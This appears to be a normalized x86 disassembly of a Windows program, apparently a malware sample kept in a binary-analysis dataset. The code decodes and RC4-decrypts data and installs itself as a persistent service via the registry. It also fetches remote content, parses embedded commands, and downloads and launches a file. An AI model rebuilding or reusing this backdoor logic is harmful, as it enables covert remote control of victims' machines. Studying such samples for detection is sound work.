sub_401010
mov eax [ esp + 0x4 ]
cmp eax 0x41
jb r-xdata
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
cmp eax 0x30
jb r-xdata
cmp eax 0x7a
ja r-xdata
add eax 0xffffffbf
retn 0x4
cmp eax 0x2d
jne r-xdata
cmp eax 0x39
ja r-xdata
add eax 0xffffffb9
retn 0x4
sub eax 0x2f
neg eax
sbb eax eax
and al 0xc0
add eax 0x3f
retn 0x4
mov eax 0x3e
retn 0x4
add eax 0x4
retn 0x4
sub_401060
push ecx
push ebx
mov ebx [ esp + 0xc ]
test ebx ebx
mov [ esp + 0x4 ] ecx
je r-xdata
xor eax eax
pop ebx
pop ecx
retn 0x10
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
mov [ esp + 0xc ] 0x0
add eax ebx
cmp ebx eax
mov [ esp + 0x10 ] eax
jae r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0xc ]
pop ebx
mov [ ecx ] eax
mov eax 0x1
pop ecx
retn 0x10
push ebp
push esi
push edi
mov eax edi
mov ecx 0x18
cdq
and edx 0x7
sub ecx edi
add eax edx
sar eax 0x3
shl esi cl
test eax eax
jle r-xdata
movsx ecx [ ebx ]
push ecx
mov ecx [ esp + 0x14 ]
call sub_401010
inc ebx
cmp eax 0xffffffff
jne r-xdata
cmp ebx [ esp + 0x1c ]
jb r-xdata
add [ esp + 0x18 ] eax
shl esi 0x6
or esi eax
add edi 0x6
dec ebp
jmp r-xdata
xor esi esi
xor edi edi
xor ebp ebp
pop edi
pop esi
pop ebp
mov edi [ esp + 0x20 ]
mov edx esi
shr edx 0x10
mov [ edi ] dl
shl esi 0x8
inc edi
dec eax
mov [ esp + 0x20 ] edi
jne r-xdata
cmp ebx [ esp + 0x1c ]
jae r-xdata
inc ebp
cmp ebp 0x4
jl r-xdata
sub_4011b0
sub esp 0x8
xor eax eax
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x24 ]
mov ecx edi
mov [ ecx ] al
inc eax
inc ecx
cmp ax 0x100
jl r-xdata
mov [ esp + 0x24 ] 0x0
xor ecx ecx
mov esi edi
mov [ esp + 0x10 ] 0x100
mov [ esp + 0x14 ] cl
mov ecx [ esp + 0x14 ]
and ecx 0xff
inc eax
mov bl [ ecx + edi ]
mov [ esi ] bl
mov [ ecx + edi ] dl
cdq
idiv [ esp + 0x20 ]
mov eax [ esp + 0x10 ]
inc esi
dec eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x24 ] dl
jne r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
mov eax [ esp + 0x24 ]
mov ebp [ esp + 0x1c ]
mov dl [ esi ]
and eax 0xff
xor ebx ebx
mov bl [ eax + ebp ]
mov ebp edx
and ebp 0xff
add ecx ebx
add ecx ebp
and ecx 0x800000ff
jns r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
sub_401240
sub esp 0x8
mov eax [ esp + 0x10 ]
push edi
xor edi edi
cmp eax edi
mov [ esp + 0x4 ] edi
jle r-xdata
pop edi
add esp 0x8
retn
mov ecx [ esp + 0x18 ]
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push esi
xor eax eax
xor esi esi
mov [ esp + 0x24 ] al
mov eax [ esp + 0x24 ]
and eax 0xff
mov dl [ eax + ecx ]
mov ebx edx
and ebx 0xff
add ebx esi
and ebx 0x800000ff
jns r-xdata
dec eax
or eax 0xffffff00
inc eax
mov [ esp + 0x1c ] bl
mov [ esp + 0x14 ] dl
mov esi [ esp + 0x1c ]
and esi 0xff
mov bl [ esi + ecx ]
mov [ eax + ecx ] bl
mov ebx [ esp + 0x14 ]
mov [ esi + ecx ] dl
xor edx edx
mov dl [ eax + ecx ]
and ebx 0xff
add edx ebx
and edx 0x800000ff
jns r-xdata
dec ebx
or ebx 0xffffff00
inc ebx
mov bl [ edi + ebp ]
and edx 0xff
mov dl [ edx + ecx ]
xor bl dl
mov edx [ esp + 0x10 ]
inc edx
mov [ edi + ebp ] bl
movsx edi dx
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x20 ]
cmp edi edx
jl r-xdata
dec edx
or edx 0xffffff00
inc edx
inc eax
and eax 0x800000ff
jns r-xdata
pop esi
pop ebp
pop ebx
sub_401310
push ecx
push ebx
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x10 ]
call sub_401000
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x14 ]
push eax
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
mov ebx [ esp + 0x1c ]
not ecx
dec ecx
push ebx
push ecx
push esi
lea ecx [ esp + 0x1c ]
call sub_401060
mov ecx [ esp + 0x14 ]
pop edi
pop esi
mov [ ecx + ebx ] 0x0
mov eax [ esp + 0xc ]
pop ebx
pop ecx
retn
sub_401370
sub esp 0x218
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
push ebx
push ebp
push esi
mov [ esp + 0x10 ] eax
mov al [ rw-data ]
push edi
push 0x100
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] al
call Ordinal_MFC42_823
mov esi [ esp + 0x230 ]
mov ebp eax
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0x4
xor edx edx
mov [ esp + 0x10 ] ebp
[ edi ]
not ecx
dec ecx
je r-xdata
mov [ esp + edx + 0x24 ] 0x0
push ebp
lea edx [ esp + 0x18 ]
push 0xd
push edx
call sub_4011b0
mov edi esi
or ecx 0xffffffff
xor eax eax
push ebp
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x34 ]
push ecx
push eax
call sub_401240
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0x18
xor ebx ebx
[ edi ]
not ecx
dec ecx
je r-xdata
mov ebx esi
lea ecx [ esp + 0x24 ]
sub ebx ecx
mov edx [ esp + 0x230 ]
test ebp ebp
mov [ ebx + edx ] 0x0
je r-xdata
mov edx [ esp + 0x230 ]
lea ebp [ esp + 0x24 ]
sub ebp edx
lea eax [ ebx + edx ]
mov edi esi
inc edx
mov cl [ esp + eax + 0x24 ]
xor eax eax
mov [ esp + edx + 0x23 ] cl
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp edx ecx
jb r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0x218
retn
push ebp
call Ordinal_MFC42_825
add esp 0x4
mov cl [ edx + ebp ]
inc ebx
mov [ edx ] cl
mov edi esi
or ecx 0xffffffff
xor eax eax
inc edx
[ edi ]
not ecx
dec ecx
cmp ebx ecx
jb r-xdata
mov ebp [ esp + 0x10 ]
sub_401480
mov eax 0x1c10
call sub_4022f0
push ebx
mov eax [ esp + 0x1c18 ]
push ebp
push esi
xor ebx ebx
mov esi [ CreateFileA@IAT ]
push edi
push ebx
push 0x80
push 0x3
push ebx
push 0x1
push 0x80000000
push eax
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
call esi
mov ebp eax
cmp ebp 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c10
retn
mov ecx [ esp + 0x1c28 ]
push ebx
push 0x80
push 0x4
push ebx
push 0x2
push 0x40000000
push ecx
call esi
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ecx 0x400
xor eax eax
lea edi [ esp + 0xc1c ]
lea edx [ esp + 0x10 ]
[ edi ]
stosb [ edi ]
push ebx
push edx
lea eax [ esp + 0xc24 ]
push 0x1000
push eax
push ebp
call [ ReadFile@IAT ]
test eax eax
je r-xdata
xor esi esi
jmp r-xdata
mov edi [ CloseHandle@IAT ]
cmp ebp ebx
je r-xdata
mov eax [ esp + 0x10 ]
cmp eax ebx
je r-xdata
cmp esi ebx
je r-xdata
push ebp
call edi
mov [ esp + eax + 0xc1c ] bl
mov ecx 0x300
xor eax eax
lea edi [ esp + 0x18 ]
[ edi ]
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0xc1c ]
push ecx
push edx
stosb [ edi ]
call sub_401310
add esp 0x8
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x18 ]
mov [ esp + eax + 0x18 ] bl
push ebx
push ecx
push eax
push edx
push esi
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
push esi
call edi
sub_401590
sub esp 0x40c
push esi
push edi
xor edi edi
push rw-data
mov [ esp + 0x10 ] edi
mov [ esp + 0xc ] edi
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
add esp 0x40c
retn
mov edi [ GetProcAddress@IAT ]
push ebx
push ebp
push rw-data
push esi
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push rw-data
push esi
mov [ rw-data ] eax
call edi
push 0x0
push 0x0
push 0x0
push 0x0
push rw-data
mov [ rw-data ] eax
call [ rw-data ]
mov ebp eax
test ebp ebp
je r-xdata
push esi
call [ FreeLibrary@IAT ]
mov eax [ esp + 0x14 ]
pop ebp
pop ebx
pop edi
pop esi
add esp 0x40c
retn
mov eax [ esp + 0x420 ]
push 0x0
push 0x80000000
push 0x0
push 0x0
push eax
push ebp
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
push ebp
call [ rw-data ]
test ebx ebx
je r-xdata
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x18 ]
lea edx [ esp + 0x18 ]
[ edi ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] 0x0
push ecx
push 0x400
push edx
push ebx
stosb [ edi ]
call [ rw-data ]
test eax eax
je r-xdata
push ebx
call [ rw-data ]
mov eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
push ecx
mov [ esp + eax + 0x1c ] 0x0
mov eax [ esp + 0x428 ]
push eax
mov [ eax ] 0x0
call sub_4016d0
add esp 0x8
test eax eax
je r-xdata
mov [ esp + 0x14 ] 0x1
sub_4016d0
push ecx
mov eax [ esp + 0xc ]
push ebx
push ebp
push esi
push edi
xor edi edi
xor esi esi
cmp eax edi
mov [ esp + 0x10 ] edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov ebx [ strchr@IAT ]
push 0x3c
push eax
call ebx
add esp 0x8
cmp eax edi
je r-xdata
mov edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
call Ordinal_MFC42_823
mov ebp eax
mov eax [ esp + 0x14 ]
push ebp
push eax
mov [ ebp ] 0x0
call sub_401310
mov [ eax + ebp ] 0x0
mov al [ ebp ]
add esp 0xc
cmp al 0x73
je r-xdata
cmp esi edi
jne r-xdata
lea ecx [ ebp + 0x2 ]
push ecx
call [ atoi@IAT ]
mov ecx [ esp + 0x1c ]
add esp 0x4
mov [ ecx + 0x4 ] eax
neg eax
sbb eax eax
add eax 0x2
mov [ ecx ] eax
cmp al 0x53
je r-xdata
cmp [ eax + 0x1 ] 0x21
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push ebp
call Ordinal_MFC42_825
add esp 0x4
cmp al 0x64
je r-xdata
cmp [ eax + 0x2 ] 0x2d
jne r-xdata
push 0x20
push ebp
call ebx
mov edx [ esp + 0x20 ]
add esp 0x8
test eax eax
mov [ esp + 0x1c ] eax
jne r-xdata
cmp al 0x44
je r-xdata
cmp [ eax + 0x3 ] 0x2d
jne r-xdata
sub eax ebp
lea esi [ ebp + 0x2 ]
lea edi [ edx + 0x29 ]
mov [ edx ] 0x3
lea ecx [ eax - 0x2 ]
add edx 0x42a
mov ebx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov [ eax + edx - 0x403 ] 0x0
mov eax [ esp + 0x1c ]
or ecx 0xffffffff
lea edi [ eax + 0x1 ]
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov [ edx ] 0x4
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov [ ecx ] 0x0
jmp r-xdata
cmp [ eax + 0x4 ] 0x20
jne r-xdata
test ebp ebp
mov esi 0x1
je r-xdata
add eax 0x5
push 0x20
push eax
mov [ esp + 0x18 ] eax
call ebx
add esp 0x8
cmp eax edi
je r-xdata
mov dl [ eax + 0x1 ]
lea ecx [ eax + 0x1 ]
cmp dl 0x2d
jne r-xdata
push 0x20
push ecx
call ebx
add esp 0x8
cmp eax edi
je r-xdata
cmp [ eax + 0x2 ] 0x2d
jne r-xdata
jmp r-xdata
cmp [ eax + 0x3 ] 0x3e
je r-xdata
cmp eax edi
mov [ eax + 0x1 ] 0x0
mov esi 0x1
jne r-xdata
sub_401880
push ebx
push esi
push edi
xor ebx ebx
push 0xf003f
push ebx
push ebx
call [ OpenSCManagerA@IAT ]
mov edi eax
test edi edi
je r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
retn
push 0xf01ff
push rw-data
push edi
call [ OpenServiceA@IAT ]
mov esi eax
test esi esi
je r-xdata
push edi
mov edi [ CloseServiceHandle@IAT ]
call edi
test esi esi
je r-xdata
mov ebx 0x1
push esi
call edi
sub_4018d0
sub esp 0x198
push ebx
push ebp
push esi
push edi
mov ecx 0x21
mov esi rw-data
lea edi [ esp + 0x18 ]
xor eax eax
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx 0x41
lea edi [ esp + 0xa0 ]
[ edi ]
stosb [ edi ]
lea eax [ esp + 0xa0 ]
xor ebx ebx
push 0x104
push eax
push ebx
mov [ esp + 0x20 ] ebx
xor ebp ebp
mov [ esp + 0x1c ] ebx
call [ GetModuleFileNameA@IAT ]
test eax eax
je r-xdata
mov edi [ esp + 0x14 ]
push 0xf003f
push ebp
push ebp
mov [ esp + eax + 0xac ] 0x0
call [ OpenSCManagerA@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ CloseServiceHandle@IAT ]
test ebx ebx
je r-xdata
push eax
call [ RegCloseKey@IAT ]
mov [ esp + 0x10 ] 0x0
push ebp
push ebp
push ebp
push ebp
lea ecx [ esp + 0xb0 ]
push ebp
push ecx
push ebp
push 0x2
push 0x10
push 0xf01ff
push rw-data
push rw-data
push ebx
call [ CreateServiceA@IAT ]
mov ebp eax
test ebp ebp
je r-xdata
test ebp ebp
je r-xdata
push ebx
call esi
push 0x10
push rw-data
push ebx
call [ OpenServiceA@IAT ]
mov ebp eax
test ebp ebp
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x198
retn
push ebp
call esi
lea edx [ esp + 0x10 ]
push edx
push 0x20006
push 0x0
push rw-data
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
[ edi ]
not ecx
lea eax [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x14 ]
push eax
push 0x1
push 0x0
push rw-data
push ecx
call [ RegSetValueExA@IAT ]
test eax eax
jne r-xdata
mov ecx 0x21
lea edi [ esp + 0x18 ]
[ edi ]
stosw [ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
mov edx [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
[ edi ]
not ecx
push ecx
lea ecx [ esp + 0x1c ]
push ecx
push 0x1
push eax
push rw-data
push edx
call [ RegSetValueExA@IAT ]
test eax eax
jne r-xdata
push eax
push eax
push ebp
call [ StartServiceA@IAT ]
mov edi 0x1
jmp r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
sub_401a90
push esi
xor esi esi
push sub_401b20
push rw-data
mov [ rw-data ] 0x30
mov [ rw-data ] 0x2
mov [ rw-data ] 0x3
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
call [ RegisterServiceCtrlHandlerA@IAT ]
cmp eax esi
mov [ rw-data ] eax
je r-xdata
pop esi
retn 0x8
push rw-data
push eax
mov [ rw-data ] 0x4
mov [ rw-data ] esi
mov [ rw-data ] esi
call [ SetServiceStatus@IAT ]
test eax eax
je r-xdata
call sub_401ba0
sub_401b20
mov eax [ esp + 0x4 ]
dec eax
je r-xdata
mov ecx [ rw-data ]
xor eax eax
push rw-data
push ecx
mov [ rw-data ] 0x1
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
call [ SetServiceStatus@IAT ]
retn 0x4
dec eax
je r-xdata
mov [ rw-data ] 0x7
dec eax
jne r-xdata
mov eax [ rw-data ]
push rw-data
push eax
call [ SetServiceStatus@IAT ]
retn 0x4
mov eax [ rw-data ]
push rw-data
push eax
mov [ rw-data ] 0x4
call [ SetServiceStatus@IAT ]
retn 0x4
sub_401ba0
push esi
call sub_401c90
test eax eax
je r-xdata
pop esi
retn
mov esi [ Sleep@IAT ]
mov eax [ rw-data ]
cmp eax 0x4
ja r-xdata
push 0x124f80
call esi
jmp r-xdata
push 0x2dc6c0
call esi
jmp r-xdata
jmp [ eax * 4 + jump_table_401c74 ]
push rw-data
push rw-data
call sub_401590
add esp 0x8
test eax eax
jne r-xdata
push 0x200b20
call esi
jmp r-xdata
mov eax [ rw-data ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 8 ]
shl eax 0x7
push eax
call esi
jmp r-xdata
push 0x927c0
call esi
jmp r-xdata
push rw-data
push rw-data
call sub_401eb0
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
push 0xdbba0
call esi
jmp r-xdata
cmp eax 0xfffffffe
jne r-xdata
push 0x1b7740
call esi
jmp r-xdata
push 0x36ee80
call esi
jmp r-xdata
push 0x16e360
call esi
jmp r-xdata
sub_401c90
sub esp 0x320
push ebp
push esi
push edi
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x20 ]
[ edi ]
stosb [ edi ]
lea eax [ esp + 0x20 ]
xor esi esi
push 0x104
push eax
push esi
mov [ esp + 0x1c ] esi
mov [ esp + 0x28 ] esi
mov [ esp + 0x24 ] esi
call [ GetModuleFileNameA@IAT ]
cmp eax esi
je r-xdata
mov eax esi
pop edi
pop esi
pop ebp
add esp 0x320
retn
push esi
push 0x80
push 0x3
push esi
push 0x1
lea ecx [ esp + 0x34 ]
push 0x80000000
push ecx
mov [ esp + eax + 0x3c ] 0x0
call [ CreateFileA@IAT ]
mov ebp eax
cmp ebp 0xffffffff
je r-xdata
push ebx
mov ebx [ SetFilePointer@IAT ]
mov [ esp + 0x18 ] 0x1
or edi 0xffffffff
test ebp ebp
pop ebx
je r-xdata
mov esi [ ReadFile@IAT ]
lea edx [ esp + 0x14 ]
push 0x0
push edx
lea eax [ esp + 0x18 ]
push 0x1
push eax
push ebp
mov [ esp + 0x24 ] 0x0
call esi
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
add esp 0x320
retn
push ebp
call [ CloseHandle@IAT ]
mov eax [ esp + 0x20 ]
test eax eax
mov al [ esp + 0x10 ]
je r-xdata
mov esi [ esp + 0x18 ]
inc esi
dec edi
test al al
mov [ esp + 0x18 ] esi
je r-xdata
test al al
je r-xdata
push 0x2
push 0x0
push edi
push ebp
call ebx
cmp eax 0x83
je r-xdata
mov [ esp + 0x20 ] 0x1
jmp r-xdata
mov eax [ esp + 0x18 ]
mov ecx 0x1
push 0x2
sub ecx eax
push 0x0
push ecx
push ebp
call ebx
cmp eax 0x83
je r-xdata
lea edx [ esp + 0x14 ]
push 0x0
push edx
lea eax [ esp + 0x1a ]
push 0x1
push eax
push ebp
mov [ esp + 0x26 ] 0x0
call esi
test eax eax
je r-xdata
movsx ebx [ esp + 0x12 ]
cmp ebx 0x400
mov [ esp + 0x13 ] 0x0
ja r-xdata
mov ecx 0x80
xor eax eax
lea edi [ esp + 0x12c ]
[ edi ]
test ebx ebx
stosb [ edi ]
je r-xdata
lea edi [ esp + 0x12c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
test ebx ebx
mov [ esp + ecx + 0x12c ] al
jne r-xdata
jmp r-xdata
mov ecx 0x100
mov edi rw-data
[ edi ]
stosb [ edi ]
lea eax [ esp + 0x12c ]
push rw-data
push eax
call sub_401370
add esp 0x8
mov [ eax + rw-data ] bl
mov [ esp + 0x1c ] 0x1
lea ecx [ esp + 0x14 ]
push 0x0
push ecx
lea edx [ esp + 0x18 ]
push 0x1
push edx
push ebp
mov [ esp + 0x24 ] 0x0
call esi
test eax eax
je r-xdata
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x11 ] 0x0
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x12c ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov al [ esp + 0x10 ]
mov ecx edx
and ecx 0x3
dec ebx
test al al
[ edi ] [ esi ]
je r-xdata
test ebx ebx
jne r-xdata
mov esi [ ReadFile@IAT ]
sub_401eb0
mov eax [ esp + 0x4 ]
sub esp 0x54
push esi
mov esi [ esp + 0x60 ]
push esi
push eax
call sub_401f60
add esp 0x8
test eax eax
jne r-xdata
xor ecx ecx
push edi
mov [ esp + 0x8 ] ecx
xor eax eax
mov [ esp + 0xc ] ecx
lea edi [ esp + 0x18 ]
mov [ esp + 0x10 ] ecx
lea edx [ esp + 0x8 ]
mov [ esp + 0x14 ] ecx
mov ecx 0x11
[ edi ]
mov [ esp + 0x48 ] ax
lea eax [ esp + 0x18 ]
push edx
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
push 0x0
mov [ esp + 0x40 ] 0x44
mov [ esp + 0x6c ] 0x1
call [ CreateProcessA@IAT ]
test eax eax
pop edi
jne r-xdata
or eax 0xffffffff
pop esi
add esp 0x54
retn
mov ecx [ esp + 0x4 ]
mov esi [ CloseHandle@IAT ]
push ecx
call esi
mov edx [ esp + 0x8 ]
push edx
call esi
mov eax 0x1
pop esi
add esp 0x54
retn
mov eax 0xfffffffe
pop esi
add esp 0x54
retn
sub_401f60
sub esp 0x524
push ebx
push ebp
push esi
mov esi [ LoadLibraryA@IAT ]
push edi
xor edi edi
push rw-data
mov [ esp + 0x1c ] edi
xor ebx ebx
mov [ esp + 0x18 ] edi
mov [ esp + 0x20 ] edi
call esi
mov ebp eax
cmp ebp edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x524
retn
push rw-data
call esi
mov edi eax
test edi edi
mov [ esp + 0x10 ] edi
je r-xdata
mov esi [ FreeLibrary@IAT ]
push ebp
call esi
test edi edi
je r-xdata
mov esi [ GetProcAddress@IAT ]
push rw-data
push ebp
call esi
push rw-data
push ebp
mov [ rw-data ] eax
call esi
push rw-data
push ebp
mov [ rw-data ] eax
call esi
push rw-data
push ebp
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push ebx
push ebx
push ebx
push ebx
push rw-data
mov esi eax
call [ rw-data ]
test eax eax
mov [ esp + 0x24 ] eax
je r-xdata
test ebx ebx
je r-xdata
push edi
call esi
mov ecx [ esp + 0x538 ]
push ebx
push 0x4000000
push ebx
push ebx
push ecx
push eax
call [ rw-data ]
test eax eax
mov [ esp + 0x20 ] eax
je r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x524
retn
push ebx
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x24 ]
push ecx
call [ rw-data ]
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x28 ]
mov edx [ esp + 0x53c ]
[ edi ]
stosb [ edi ]
lea eax [ esp + 0x28 ]
push edx
push eax
call sub_402170
add esp 0x8
lea ecx [ esp + 0x28 ]
push ebx
push 0x80
push 0x4
push ebx
push 0x2
push 0x40000000
push ecx
call [ CreateFileA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
push eax
call [ rw-data ]
mov ecx 0x100
xor eax eax
lea edi [ esp + 0x130 ]
lea edx [ esp + 0x14 ]
[ edi ]
mov ecx [ esp + 0x20 ]
push edx
stosb [ edi ]
lea eax [ esp + 0x134 ]
push 0x400
push eax
push ecx
call [ rw-data ]
test eax eax
je r-xdata
xor ebx ebx
jmp r-xdata
mov edi [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
test ebx ebx
je r-xdata
lea edx [ esp + 0x1c ]
push 0x0
push edx
mov [ esp + eax + 0x138 ] 0x0
push eax
lea eax [ esp + 0x13c ]
push eax
push ebx
mov [ esp + 0x30 ] 0x0
call esi
test eax eax
je r-xdata
mov ecx [ esp + 0x53c ]
lea edx [ esp + 0x28 ]
push ecx
push edx
call sub_401480
add esp 0x8
lea eax [ esp + 0x28 ]
push eax
call [ DeleteFileA@IAT ]
mov [ esp + 0x18 ] 0x1
push ebx
call [ CloseHandle@IAT ]
xor ebx ebx
mov [ esp + 0x14 ] 0x0
jmp r-xdata
sub_402170
sub esp 0x108
push ebp
mov ebp [ esp + 0x114 ]
push esi
push edi
mov dl [ ebp ]
mov eax ebp
test dl dl
je r-xdata
mov cl [ eax ]
cmp cl 0x5c
je r-xdata
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
sub eax ebp
mov ecx 0x41
mov esi eax
xor eax eax
lea edi [ esp + 0xc ]
push esi
[ edi ]
stosb [ edi ]
lea eax [ esp + 0x10 ]
push ebp
push eax
call [ strncpy@IAT ]
mov ebp [ esp + 0x124 ]
add esp 0xc
lea ecx [ esp + 0xc ]
mov [ esp + esi + 0xc ] 0x0
push ebp
push 0x0
push rw-data
push ecx
call [ GetTempFileNameA@IAT ]
mov edi ebp
or ecx 0xffffffff
xor eax eax
push ebp
[ edi ]
not ecx
dec ecx
mov [ ecx + ebp ] al
call [ DeleteFileA@IAT ]
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov [ ecx + ebp - 0x3 ] al
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
pop edi
pop esi
mov [ ecx + ebp ] al
pop ebp
add esp 0x108
retn
cmp cl dl
je r-xdata
mov cl [ eax - 0x1 ]
dec eax
cmp cl 0x5c
jne r-xdata
sub_402250
sub esp 0x10
xor eax eax
mov [ esp ] rw-data
mov [ esp + 0x4 ] sub_401a90
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
call sub_401880
test eax eax
jne r-xdata
lea eax [ esp ]
push eax
call [ StartServiceCtrlDispatcherA@IAT ]
mov eax 0x1
add esp 0x10
retn 0x10
call sub_4018d0
mov eax 0x1
add esp 0x10
retn 0x10
sub_4022f0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_4024a5
cmp [ rw-data ] ebx
jne r-xdata
call sub_402490
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_4024a2
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
